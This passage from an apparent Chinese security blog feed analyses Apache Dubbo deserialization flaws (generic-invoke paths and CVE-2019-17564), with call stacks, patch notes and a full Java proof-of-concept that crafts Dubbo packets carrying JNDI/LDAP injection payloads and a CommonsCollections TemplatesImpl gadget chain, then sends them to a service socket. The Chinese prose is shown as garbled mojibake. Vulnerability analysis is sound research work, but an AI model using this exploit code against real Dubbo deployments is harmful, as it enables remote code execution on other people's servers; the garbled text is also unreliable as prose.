class="code"><pre><code class="hljs java">setAsText:<span class="hljs-number">59</span>, AbstractConverter (org.apache.xbean.propertyeditor)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>realize0:<span class="hljs-number">483</span>, PojoUtils (org.apache.dubbo.common.utils)<br>realize:<span class="hljs-number">211</span>, PojoUtils (org.apache.dubbo.common.utils)<br>realize:<span class="hljs-number">99</span>, PojoUtils (org.apache.dubbo.common.utils)<br>invoke:<span class="hljs-number">91</span>, GenericFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">41</span>, EchoFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)<br></code></pre></td></tr></table></figure><p>2ã€å¦‚æœgenericä¸ºbean, åˆ™å°†ä¼šè°ƒç”¨<code>JavaBeanSerializeUtil#deserialize</code>å¤„ç†</p><p><img src="/2024/09/02/Dubbo/image-20240908001222281.png" alt="image-20240908001222281"></p><p>å…¶ä¸­è°ƒç”¨äº†<code>instantiateForDeserialize</code>æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªJavaBeanDescriptoræè¿°çš„å¯¹è±¡</p><p>ä¹‹åè°ƒç”¨<code>deserializeInternal</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œ å¦‚æœbeanDescriptor.isBeanType()ï¼ˆåªéœ€è¦å®ä¾‹åŒ–JavaBeanDescriptoræ—¶æŒ‡å®šå³å¯ï¼‰ï¼Œåˆ™å°†éå†beanDescriptorï¼Œè·å–propertyåŠvalueï¼Œè°ƒç”¨getSetterMethodè·å–å¯¹åº”çš„setæ–¹æ³•</p><p>æœ€ååˆ©ç”¨åå°„æ‰§è¡Œmethod.invoke(dest, value);ï¼Œå°±å¯ä»¥ä½¿ç”¨org.apache.xbean.propertyeditor.JndiConverterçš„setAsTextæ‰“JNDIæ³¨å…¥ã€‚</p><p><img src="/2024/09/02/Dubbo/image-20240908001303999.png" alt="image-20240908001303999"></p><p>è°ƒç”¨æ ˆä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">setAsText:<span class="hljs-number">59</span>, AbstractConverter (org.apache.xbean.propertyeditor)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>deserializeInternal:<span class="hljs-number">282</span>, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)<br>deserialize:<span class="hljs-number">215</span>, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)<br>deserialize:<span class="hljs-number">204</span>, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)<br>invoke:<span class="hljs-number">115</span>, GenericFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">41</span>, EchoFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)<br></code></pre></td></tr></table></figure><p>3ã€å¦‚æœgenericæ˜¯nativejava, å°†éå†argsï¼Œå¦‚æœargs[i]çš„ç±»å‹ä¸ºbyteï¼Œä»¥args[]ä¸ºå‚å®ä¾‹åŒ–ä¸€ä¸ªUnsafeByteArrayInputStreamï¼Œå†é€šè¿‡åå°„è·å¾—NativeJavaSerializationï¼Œå†è°ƒç”¨NativeJavaSerialization#readObjectæ–¹æ³•</p><p><img src="/2024/09/02/Dubbo/image-20240908001352732.png" alt="image-20240908001352732"></p><p>ç›¸å½“äºæ‰§è¡Œäº†<code>UnsafeByteArrayInputStream#readObject</code>æ–¹æ³•é€ æˆäº†ååºåˆ—åŒ–</p><p>è°ƒç”¨æ ˆä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">readObject:<span class="hljs-number">371</span>, ObjectInputStream (java.io)<br>readObject:<span class="hljs-number">50</span>, NativeJavaObjectInput (org.apache.dubbo.common.serialize.nativejava)<br>invoke:<span class="hljs-number">98</span>, GenericFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">41</span>, EchoFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)<br></code></pre></td></tr></table></figure><h5 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-comment">// header.</span><br>        <span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-comment">// set magic number.</span><br>        Bytes.short2bytes((<span class="hljs-type">short</span>) <span class="hljs-number">0xdabb</span>, header);<br>        <span class="hljs-comment">// set request and serialization flag.</span><br>        header[<span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((<span class="hljs-type">byte</span>) <span class="hljs-number">0x80</span> | <span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// set request id.</span><br>        Bytes.long2bytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100000000</span>), header, <span class="hljs-number">4</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">hessian2ByteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2ObjectOutput</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2ObjectOutput</span>(hessian2ByteArrayOutputStream);<br><br>        <span class="hljs-comment">// set body</span><br>        out.writeUTF(<span class="hljs-string">&quot;2.7.9&quot;</span>);<br>        <span class="hljs-comment">// todo æ­¤å¤„å¡«å†™Dubboæä¾›çš„æœåŠ¡å</span><br>        out.writeUTF(<span class="hljs-string">&quot;org.apache.dubbo.spring.boot.demo.consumer.DemoService&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;$invoke&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;&quot;</span>);<br>        <span class="hljs-comment">// todo æ­¤å¤„å¡«å†™Dubboæä¾›çš„æœåŠ¡çš„æ–¹æ³•</span><br>        out.writeUTF(<span class="hljs-string">&quot;sayHello&quot;</span>);<br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;java.lang.String&quot;</span>&#125;);<br><br>        <span class="hljs-comment">// POC 1: raw.return</span><br><span class="hljs-comment">//        getRawReturnPayload(out, &quot;ldap://127.0.0.1:8087/Exploit&quot;);</span><br><br>        <span class="hljs-comment">// POC 2: bean</span><br>        getBeanPayload(out, <span class="hljs-string">&quot;ldap://127.0.0.1:1389/xitdbc&quot;</span>);<br><br>        <span class="hljs-comment">// POC 3: nativejava</span><br><span class="hljs-comment">//        getNativeJavaPayload(out, &quot;src\\main\\java\\top\\lz2y\\1.ser&quot;);</span><br><br>        out.flushBuffer();<br><br>        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, <span class="hljs-number">12</span>);<br>        byteArrayOutputStream.write(header);<br>        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());<br><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-comment">//todo æ­¤å¤„å¡«å†™DubboæœåŠ¡åœ°å€åŠç«¯å£</span><br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>);<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>        outputStream.write(bytes);<br>        outputStream.flush();<br>        outputStream.close();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getRawReturnPayload</span><span class="hljs-params">(Hessian2ObjectOutput out, String ldapUri)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">jndi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        jndi.put(<span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>);<br>        jndi.put(<span class="hljs-string">&quot;asText&quot;</span>, ldapUri);<br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;jndi&#125;);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;generic&quot;</span>, <span class="hljs-string">&quot;raw.return&quot;</span>);<br>        out.writeObject(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getBeanPayload</span><span class="hljs-params">(Hessian2ObjectOutput out, String ldapUri)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaBeanDescriptor</span> <span class="hljs-variable">javaBeanDescriptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBeanDescriptor</span>(<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-number">7</span>);<br>        javaBeanDescriptor.setProperty(<span class="hljs-string">&quot;asText&quot;</span>,ldapUri);<br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;javaBeanDescriptor&#125;);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        map.put(<span class="hljs-string">&quot;generic&quot;</span>, <span class="hljs-string">&quot;bean&quot;</span>);<br>        out.writeObject(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getNativeJavaPayload</span><span class="hljs-params">(Hessian2ObjectOutput out, String serPath)</span> <span class="hljs-keyword">throws</span> Exception, NotFoundException &#123;<br>        <span class="hljs-comment">//åˆ›å»ºTemplatesImplå¯¹è±¡åŠ è½½å­—èŠ‚ç </span><br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(<span class="hljs-string">&quot;ysoserial.vulndemo.Calc&quot;</span>).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;RoboTerh&quot;</span>);<br>        setFieldValue(obj,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(obj,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(obj,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br><br>        <span class="hljs-comment">//åˆ›å»º ChainedTransformerå®ä¾‹</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//åˆ›å»ºTranformingComparator å®ä¾‹</span><br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chain);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(priorityQueue, comparator);<br><br>        <span class="hljs-comment">//åºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baor);<br>        oos.writeObject(priorityQueue);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] payload = baor.toByteArray();<br><br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;payload&#125;);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;generic&quot;</span>, <span class="hljs-string">&quot;nativejava&quot;</span>);<br>        out.writeObject(map);<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h5><p>åœ¨2.7.10ç‰ˆæœ¬ä½¿ç”¨äº†é»‘åå•æ¥é˜»æ–­raw.returnå’Œbeanè¿™ä¸¤æ¡é“¾</p><p>åˆ†åˆ«åœ¨<code>org\apache\dubbo\common\utils\PojoUtils.java#realize0</code> <code>org\apache\dubbo\common\beanutil\JavaBeanSerializeUtil.java#name2Class</code></p><p>è€Œnativejavaåˆ™é€šè¿‡åˆ¤æ–­é…ç½®æ–‡ä»¶æ˜¯å¦å…è®¸nativejavaçš„ååºåˆ—åŒ–ã€‚</p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>é™¤äº†hessianï¼Œè¿˜æœ‰ä¸ªç¨å¾®æœ‰ç‚¹è¿œçš„httpæ¼æ´<code>CVE-2019-17564</code>ã€‚</p><h4 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h4><ul><li>2.7.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.7.4</li><li>2.6.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.6.7</li><li>Apache Dubbo &#x3D; 2.5.x</li></ul><p>è¿™ä¸ªCVEä¸»è¦æ˜¯å› ä¸ºåœ¨å‘é€POSTè¯·æ±‚çš„æ—¶å€™å°†ä¼šå°†bodyä¸­çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–å¤„ç†é€ æˆäº†æ¼æ´</p><p>æˆ‘ä»¬å¯ä»¥åœ¨å¼€å¯æœåŠ¡æä¾›è€…äº†ä¹‹åï¼Œåœ¨<code>org.apache.dubbo.remoting.http.servlet.DispatcherServlet#service</code>å¤„æ‰“ä¸‹æ–­ç‚¹ï¼Œè¿™ä¸ªç±»ä¸»è¦æ˜¯å¤„ç†è¯·æ±‚çš„åˆ†å‘çš„ç±»ï¼Œåœ¨æ¥æ”¶åˆ°httpè¯·æ±‚ä¹‹åä¼šè°ƒç”¨serviceæ–¹æ³•</p><p>ä¹‹åéšä¾¿å‘é€ä¸€ä¸ªpostè¯·æ±‚ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -d <span class="hljs-string">&#x27;aa&#x27;</span> <span class="hljs-string">&#x27;http://192.168.56.1:8080/org.apache.dubbo.samples.http.api.DemoService&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/02/Dubbo/image-20240908001650492.png" alt="image-20240908001650492"></p><p>æˆåŠŸæ‹¦æˆªäº†è¿™ä¸ªhandler,ä¹‹åä¼šè°ƒç”¨handleæ–¹æ³•ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001703249.png" alt="image-20240908001703249"></p><p>ä¹‹åè°ƒç”¨<code>request.getRequestURI</code>æ–¹æ³•ï¼Œè·å–pathè·¯å¾„ï¼Œä¹‹åä¼šåœ¨ä¹‹åæŸ¥æ‰¾uriè·¯å¾„æ˜¯å¦åœ¨skeletonMapä¸­ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001720829.png" alt="image-20240908001720829"></p><p>å¦‚æœæ²¡æœ‰ï¼Œä¹‹åå°†ä¼šè¿”å›é”™è¯¯ï¼Œå› ä¸ºæ²¡æœ‰æä¾›å¯¹åº”çš„æœåŠ¡ã€‚</p><p>ä¹‹åå°±æ˜¯è·å–è¿œç¨‹åœ°å€å’Œè¿œç¨‹åœ°å€çš„ç«¯å£ï¼Œæœ€åè°ƒç”¨äº†<code>skeleton.handleRequest</code>æ–¹æ³•</p><p>è¿™ä¸ªæ—¶å€™skeletonæ˜¯<code>HttpInvokerServiceExporter</code>ç±»ï¼Œå€¼å¾—å…³æ³¨çš„ä»–çš„contentTypeå±…ç„¶æ˜¯<code>application/x-java-serialized-object</code>ç±»å‹ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001740453.png" alt="image-20240908001740453"></p><p>æ¥åˆ°handleRequestæ–¹æ³•ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001807350.png" alt="image-20240908001807350"></p><p>è·Ÿè¿›<code>readRemoteInvocation</code>æ–¹æ³•è°ƒç”¨ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001818635.png" alt="image-20240908001818635"></p><p>ç»§ç»­è°ƒç”¨å…¶æ–¹æ³•é‡è½½ï¼ˆåŠ ä¸Šäº†ä¸ªrequestä½œç”¨åŸŸçš„è¾“å…¥æµä½œä¸ºå‚æ•°ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001830796.png" alt="image-20240908001830796"></p><p>åœ¨ä¸Šé¢ç®­å¤´ä½ç½®ï¼Œæ¯”å¦‚è¦åœ¨requeståŸŸä¸­è·å–inputstreamï¼Œä¸ç„¶ä¸ä¼šè¿›å…¥<code>doReadRemoteInvocation</code>æ–¹æ³•çš„è°ƒç”¨</p><p>æˆ‘ä»¬è·Ÿè¿›æ¼æ´è§¦å‘ç‚¹æ–¹æ³•<code>doReadRemoteInvocation</code>æ–¹æ³•ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001849228.png" alt="image-20240908001849228"></p><p>åœ¨è¿™é‡Œå°†oisè¿™ä¸ªObejctInputStreamå¯¹è±¡ç›´æ¥æ²¡æœ‰è¿‡æ»¤å°±è¿›è¡Œäº†ååºåˆ—åŒ–çš„è°ƒç”¨ï¼Œé€ æˆäº†ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>è‹¥æ˜¯æœ‰ä¸ªCC3.2çš„ä¾èµ–ï¼Œç›´æ¥å¯ä»¥æ‰“CC4äº†ã€‚</p><h4 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h4><p>åœ¨<code>2.7.5</code>ç‰ˆæœ¬ä¸­ï¼Œåœ¨è·å–äº†skeletonä¹‹åè°ƒç”¨å…¶handleæ–¹æ³•ï¼Œæ­¤æ—¶çš„skeletonæ˜¯<code>JsonRpcServer</code>å¯¹è±¡ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001938135.png" alt="image-20240908001938135"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“å…¶æ˜¯è°ƒç”¨çš„å…¶çˆ¶ç±»çš„handleræ–¹æ³•ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001949320.png" alt="image-20240908001949320"></p><p>åœ¨å…¶ä¸­æ²¡æœ‰å¯ååºåˆ—åŒ–çš„æ“ä½œï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001959494.png" alt="image-20240908001959494"></p><p>å½“ç„¶è¿˜æœ‰ Redis &#x2F; Kryoç­‰ç­‰åè®®é€ æˆçš„æ¼æ´ç­‰ã€‚</p><p>Hessianåè®®è¿˜æœ‰CVE-2021-37579ï¼Œä¹Ÿæœ‰toStringBeançš„æ¼æ´CVE-2021-43297ï¼Œè¯¦è§<a href="https://mp.weixin.qq.com/s/WKeSRSEJ5hLAXzF60vau5g?ref=www.ctfiot.com">Dubboååºåˆ—åŒ–æ¼æ´åˆ†æé›†åˆ2 (qq.com)</a></p><p>å‚è€ƒï¼š</p><p><a href="https://tttang.com/archive/1730/#toc_cve-2021-30179">Dubboååºåˆ—åŒ–æ¼æ´åˆ†æé›†åˆ1 - è·³è·³ç³– (tttang.com)</a></p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/dubbo#id-0x01-what-is-dubbo">Dubbo | Java (gitbook.io)</a></p><p><a href="https://l3yx.github.io/2020/08/25/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/#CVE-2019-17564">Apache Dubbo ååºåˆ—åŒ–æ¼æ´å¤ç°ç¬”è®° | l3yxâ€™s blog</a></p><p><a href="https://mp.weixin.qq.com/s/WKeSRSEJ5hLAXzF60vau5g?ref=www.ctfiot.com">Dubboååºåˆ—åŒ–æ¼æ´åˆ†æé›†åˆ2 (qq.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024ç¾ŠåŸæ¯-web</title>
    <link href="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/"/>
    <url>/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/</url>
    
